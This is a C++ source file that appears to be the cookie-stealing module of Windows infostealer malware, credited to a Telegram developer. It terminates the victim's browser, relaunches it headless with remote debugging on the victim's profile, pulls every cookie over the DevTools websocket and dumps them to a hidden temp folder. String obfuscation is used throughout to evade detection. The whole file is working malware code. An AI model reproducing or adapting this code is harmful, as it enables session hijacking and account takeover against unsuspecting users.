#include "core.hpp"
#include <chrono>
#include <thread>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
// agai ncreds to t.me/NyxEnigma
// awesome dev
namespace {
    struct WSAInitializer {
        WSADATA wsaData;
        WSAInitializer() {
            WSAStartup(MAKEWORD(2, 2), &wsaData);
        }
        ~WSAInitializer() {
            WSACleanup();
        }
    } g_wsaInitializer;
}

void BrowserCookieExtractor::GetCookie(const std::wstring& browserPath, const std::wstring& userData, const std::wstring& name) {
    std::wstring filename = std::filesystem::path(browserPath).filename().wstring();
    TerminateBrowserProcesses(filename);
    int port = GeneratePort();

    std::wstring cmdLine = OBF(L"\"") + browserPath + OBF(L"\" --headless ") +
        OBF(L"--user-data-dir=\"") + userData + OBF(L"\" ") +
        OBF(L"--remote-debugging-port=") + std::to_wstring(port) + OBF(L" ") +
        OBF(L"--remote-allow-origins=* ") +
        OBF(L"--disable-extensions --no-sandbox --disable-gpu");

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    std::vector<wchar_t> cmdLineVec(cmdLine.begin(), cmdLine.end());
    cmdLineVec.push_back(OBF(L'\0'));

    if (!CreateProcessW(browserPath.c_str(), cmdLineVec.data(), NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) return;

    bool portReady = false;
    for (int i = 0; i < 60; ++i) {
        if (!IsPortAvailable(port)) {
            portReady = true;
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    if (!portReady) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return;
    }

    std::string cookies = FetchCookies(port);

    if (!cookies.empty()) {
        wchar_t tempPathBuf[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPathBuf);
        std::wstring tempPath(tempPathBuf);
        std::wstring filePath = tempPath + OBF(L"\\sryxen\\cookies_dump_") + name + OBF(L".txt");

        HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, cookies.c_str(), static_cast<DWORD>(cookies.size()), &written, NULL);
            CloseHandle(hFile);
        }
    }

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void BrowserCookieExtractor::TerminateBrowserProcesses(const std::wstring& processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe = { sizeof(pe) };
    if (!Process32FirstW(snapshot, &pe)) {
        CloseHandle(snapshot);
        return;
    }

    do {
        if (wcscmp(pe.szExeFile, processName.c_str()) == 0) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
            if (hProcess) {
                TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
            }
        }
    } while (Process32NextW(snapshot, &pe));

    CloseHandle(snapshot);
}

int BrowserCookieExtractor::GeneratePort() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(10000, 65535);

    int port;
    do {
        port = dist(gen);
    } while (IsPortAvailable(port));

    return port;
}

bool BrowserCookieExtractor::IsPortAvailable(int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return true;

    u_long mode = 1;
    ioctlsocket(sock, FIONBIO, &mode);

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    InetPtonA(AF_INET, OBF("127.0.0.1"), &addr.sin_addr);

    if (connect(sock, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
        int error = WSAGetLastError();
        if (error == WSAEWOULDBLOCK) {
            timeval timeout{ 1, 0 };
            fd_set writeSet;
            FD_ZERO(&writeSet);
            FD_SET(sock, &writeSet);

            int result = select(0, NULL, &writeSet, NULL, &timeout);
            if (result > 0) {
                int errorCode = 0;
                socklen_t len = sizeof(errorCode);
                getsockopt(sock, SOL_SOCKET, SO_ERROR, reinterpret_cast<char*>(&errorCode), &len);
                closesocket(sock);
                return errorCode != 0;
            }
        }
    }

    closesocket(sock);
    return false;
}

std::string BrowserCookieExtractor::FetchCookies(int port) {
    HINTERNET hSession = WinHttpOpen(OBF(L"CookieFetcher"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return "";

    HINTERNET hConnect = WinHttpConnect(hSession, OBF(L"localhost"), port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return "";
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, OBF(L"GET"), OBF(L"/json"), NULL, NULL, NULL, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    WinHttpReceiveResponse(hRequest, NULL);

    std::string response;
    DWORD size = 0;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        std::vector<char> buffer(size);
        DWORD downloaded;
        WinHttpReadData(hRequest, buffer.data(), size, &downloaded);
        response.append(buffer.data(), downloaded);
    }

    std::regex pattern(OBF("\"webSocketDebuggerUrl\":\\s*\"(ws://[^\"]+)\""));
    std::smatch match;
    std::string wsUrl;
    if (std::regex_search(response, match, pattern)) {
        wsUrl = match[1];
    }
    else {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    size_t pos = wsUrl.find(OBF("ws://"));
    if (pos != std::string::npos)
        wsUrl = wsUrl.substr(pos + 5);

    std::string host = OBF("127.0.0.1");
    int wsPort = std::stoi(wsUrl.substr(wsUrl.find(':') + 1, wsUrl.find('/') - wsUrl.find(':') - 1));
    std::string path = wsUrl.substr(wsUrl.find('/'));

    WebSocketClient ws(host, wsPort);
    if (!ws.Connect() || !ws.Handshake(path)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return "";
    }

    ws.Send(OBF(R"({"id":1,"method":"Network.getAllCookies"})"));
    std::string wsResponse = ws.Receive();

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    try {
        nlohmann::json cookieData = nlohmann::json::parse(wsResponse);
        if (!cookieData.contains("result") || !cookieData["result"].contains("cookies"))
            return "";

        std::string output;
        for (auto& cookie : cookieData["result"]["cookies"]) {
            std::string domain = cookie["domain"];
            bool secure = cookie["secure"];
            long long expires = cookie["expires"];
            std::string name = cookie["name"];
            std::string value = cookie["value"];

            output += domain + OBF("\t") +
                (domain.front() == '.' ? OBF("TRUE") : OBF("FALSE")) + OBF("\t") +
                cookie["path"].get<std::string>() + OBF("\t") +
                (secure ? OBF("TRUE") : OBF("FALSE")) + OBF("\t") +
                std::to_string(expires) + OBF("\t") +
                name + OBF("\t") +
                value + OBF("\n");
        }
        return output;
    }
    catch (...) {
        return "";
    }
}

BrowserCookieExtractor::WebSocketClient::WebSocketClient(const std::string& host, int port) : m_host(host), m_port(port), m_socket(INVALID_SOCKET) {}

bool BrowserCookieExtractor::WebSocketClient::Connect() {
    m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (m_socket == INVALID_SOCKET) return false;

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(m_port);
    InetPtonA(AF_INET, m_host.c_str(), &serverAddr.sin_addr);

    return connect(m_socket, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) != SOCKET_ERROR;
}

bool BrowserCookieExtractor::WebSocketClient::Handshake(const std::string& path) {
    std::string request = OBF("GET ") + path + OBF(" HTTP/1.1\r\n") +
        OBF("Host: ") + m_host + OBF(":") + std::to_string(m_port) + OBF("\r\n") +
        OBF("Upgrade: websocket\r\n") +
        OBF("Connection: Upgrade\r\n") +
        OBF("Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n") +
        OBF("Sec-WebSocket-Version: 13\r\n\r\n");

    if (send(m_socket, request.c_str(), static_cast<int>(request.size()), 0) == SOCKET_ERROR)
        return false;

    char buffer[1024];
    int bytesRead = recv(m_socket, buffer, sizeof(buffer), 0);
    return bytesRead > 0 && std::string(buffer, bytesRead).find(OBF("HTTP/1.1 101")) != std::string::npos;
}

void BrowserCookieExtractor::WebSocketClient::Send(const std::string& message) {
    std::vector<unsigned char> frame{ 0x81 };
    size_t len = message.size();

    if (len <= 125) {
        frame.push_back(0x80 | len);
    }
    else if (len <= 65535) {
        frame.push_back(0xFE);
        uint16_t beLen = htons(static_cast<uint16_t>(len));
        frame.insert(frame.end(), reinterpret_cast<char*>(&beLen), reinterpret_cast<char*>(&beLen) + 2);
    }
    else {
        frame.push_back(0xFF);
        uint64_t beLen = CustomNtohll(len);
        frame.insert(frame.end(), reinterpret_cast<char*>(&beLen), reinterpret_cast<char*>(&beLen) + 8);
    }

    unsigned char mask[4];
    HCRYPTPROV hProv;
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, 4, mask);
        CryptReleaseContext(hProv, 0);
    }
    else {
        std::random_device rd;
        for (int i = 0; i < 4; ++i)
            mask[i] = static_cast<unsigned char>(rd());
    }

    frame.insert(frame.end(), mask, mask + 4);
    std::string masked = message;
    for (size_t i = 0; i < len; ++i)
        masked[i] ^= mask[i % 4];

    frame.insert(frame.end(), masked.begin(), masked.end());
    send(m_socket, reinterpret_cast<char*>(frame.data()), static_cast<int>(frame.size()), 0);
}

std::string BrowserCookieExtractor::WebSocketClient::Receive() {
    char header[2];
    if (recv(m_socket, header, 2, 0) != 2) return "";

    bool masked = (header[1] & 0x80) != 0;
    uint64_t payloadLen = header[1] & 0x7F;

    if (payloadLen == 126) {
        uint16_t len;
        recv(m_socket, reinterpret_cast<char*>(&len), 2, 0);
        payloadLen = ntohs(len);
    }
    else if (payloadLen == 127) {
        uint64_t len;
        recv(m_socket, reinterpret_cast<char*>(&len), 8, 0);
        payloadLen = CustomNtohll(len);
    }

    unsigned char mask[4];
    if (masked && recv(m_socket, reinterpret_cast<char*>(mask), 4, 0) != 4)
        return "";

    std::string payload(payloadLen, '\0');
    size_t totalReceived = 0;
    while (totalReceived < payloadLen) {
        int count = recv(m_socket, &payload[totalReceived], static_cast<int>(payloadLen - totalReceived), 0);
        if (count <= 0) break;
        totalReceived += count;
    }

    if (masked) {
        for (size_t i = 0; i < payloadLen; ++i)
            payload[i] ^= mask[i % 4];
    }

    return payload;
}

BrowserCookieExtractor::WebSocketClient::~WebSocketClient() {
    closesocket(m_socket);
}

uint64_t BrowserCookieExtractor::WebSocketClient::CustomNtohll(uint64_t value) {
    return ((value & 0xFF) << 56) | ((value & 0xFF00) << 40) |
        ((value & 0xFF0000) << 24) | ((value & 0xFF000000) << 8) |
        ((value >> 8) & 0xFF000000) | ((value >> 24) & 0xFF0000) |
        ((value >> 40) & 0xFF00) | ((value >> 56) & 0xFF);
}

std::wstring BrowserCookieExtractor::StringToWstring(const std::string& str) {
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), NULL, 0);
    std::wstring wstr(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), &wstr[0], size);
    return wstr;
}

std::string BrowserCookieExtractor::WstringToString(const std::wstring& wstr) {
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), static_cast<int>(wstr.size()), NULL, 0, NULL, NULL);
    std::string str(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), static_cast<int>(wstr.size()), &str[0], size, NULL, NULL);
    return str;
}